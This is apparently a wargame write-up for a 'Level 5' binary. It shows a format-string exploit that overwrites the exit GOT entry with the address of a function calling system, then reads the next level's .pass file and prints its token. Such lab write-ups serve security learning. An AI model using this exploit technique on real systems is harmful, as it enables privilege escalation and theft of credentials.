# Level 5

- `objdump -R ./level5`
<pre>
./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
<strong>08049838</strong> R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
- (hex)0x08049838 = (little indian)\\x38\\x98\\x04\\x08
- `python -c "print('AAAA' + '\x38\x98\x04\x08' + '%x ' * 5)" | ./level5`
AAAA8200 b7fd1ac0 b7ff37d0 <strong>41414141 8049838</strong>
</pre>
- `gdb ./level5`
<pre>
(gdb) disass o
Dump of assembler code for function o:
   <strong>0x080484a4</strong> <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x18,%esp
   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
</pre>
- (hex)0x080484a5 = (dec)134513828
- `(python -c "print('AAAA' + '\x38\x98\x04\x08' + '%134513820d' + '%5\$n')"; cat) | ./level5 | tr -d ' '`
```
id
uid=2045(level5)gid=2045(level5)euid=2064(level6)egid=100(users)groups=2064(level6),100(users),2045(level5)
cat /home/user/level6/.pass
AAAA8d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
